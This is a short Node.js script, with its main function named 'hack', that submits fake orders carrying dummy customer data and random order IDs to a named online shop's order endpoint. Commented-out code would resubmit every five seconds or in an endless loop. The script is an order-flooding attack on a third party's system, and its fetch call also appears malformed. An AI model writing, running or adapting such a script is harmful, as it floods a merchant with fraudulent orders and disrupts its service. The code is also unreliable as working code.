const fetch = require("node-fetch");
let times = 1;

const hack = () => {
  const currentDate = new Date();
  const trueDate = currentDate.getMonth() + 1;

  let not3num = "";
  for (let i = 0; i < 3; i++) {
    not3num += Math.floor(Math.random() * 10);
  }

  const orderID =
    "no." +
    currentDate.getFullYear() +
    trueDate +
    currentDate.getDate() +
    currentDate.getHours() +
    currentDate.getMinutes() +
    currentDate.getSeconds() +
    not3num;

  console.log("orderID: ", orderID);
  // const url = `https://v.cjpin.com/notorder.asp?${[
  //   ["orderid", orderID],
  //   ["cname", "K001"],
  //   ["goodname", "%D6%C7%C4%DC%C9%A8%CD%CF%BB%FA%C6%F7%C8%CB"],
  //   ["product", "%C9%A8%B5%D8%BB%FA%C6%F7%C8%CB188%D4%AA"],
  //   ["mun", "1"],
  //   ["name", "testtest"],
  //   ["mob", "13400000000"],
  //   ["province", "%BA%D3%B1%B1%CA%A1"],
  //   ["city", ""],
  //   ["area", ""],
  //   ["address", "testtest%B2%E2%CA%D4"],
  //   ["zfbprice", "188"],
  //   ["ycjf", "1380"],
  //   ["price", "188"],
  //   ["pay", "wxpay"],
  //   ["guest", ""],
  //   [
  //     "fromurl",
  //     "https%3A%2F%2Fv.cjpin.com%2Forder%2Fpay.asp%3Forder_no%3D2020119223126028%26mob%3D13400000000%26nowurl%3Dhttps%3A%2F%2Fv.cjpin.com%2FK001.htm",
  //   ],
  //   ["nowurl", "https%3A%2F%2Fv.cjpin.com%2FK001.htm"],
  //   ["keyword", ""],
  //   ["gzid", ""],
  //   ["submit", ""],
  //   ["tltime", "89"],
  // ]
  //   .map((line) => `${line[0]}=${encodeURI(line[1])}`)
  //   .join("&")}`;

  fetch({
    url: `https://v.cjpin.com/notorder.asp`,
    body: {
      orderid: orderID,
      cname: "K001",
      goodname: "%D6%C7%C4%DC%C9%A8%CD%CF%BB%FA%C6%F7%C8%CB",
      product: "%C9%A8%B5%D8%BB%FA%C6%F7%C8%CB188%D4%AA",
      mun: "1",
      name: "testtest",
      mob: "13400000000",
      province: "%BA%D3%B1%B1%CA%A1",
      city: "",
      area: "",
      address: "testtest%B2%E2%CA%D4",
      zfbprice: "188",
      ycjf: "1380",
      price: "188",
      pay: "wxpay",
      guest: "qweqweqweqwe",
      fromurl:
        "https%3A%2F%2Fv.cjpin.com%2Forder%2Fpay.asp%3Forder_no%3D2020119223126028%26mob%3D13400000000%26nowurl%3Dhttps%3A%2F%2Fv.cjpin.com%2FK001.htm",
      nowurl: "https%3A%2F%2Fv.cjpin.com%2FK001.htm",
      keyword: "",
      gzid: "",
      submit: "+%C1%A2%BC%B4%CC%E1%BD%BB%B6%A9%B5%A5",
      tltime: "578",
    },
    method: "POST",
    headers: {
      "content-type": "text/html",
    },
  })
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
};

hack();
// setInterval(hack, 5000);

// let x = 1;
// while (1) {
//   console.log(++x);
//   hack();
// }
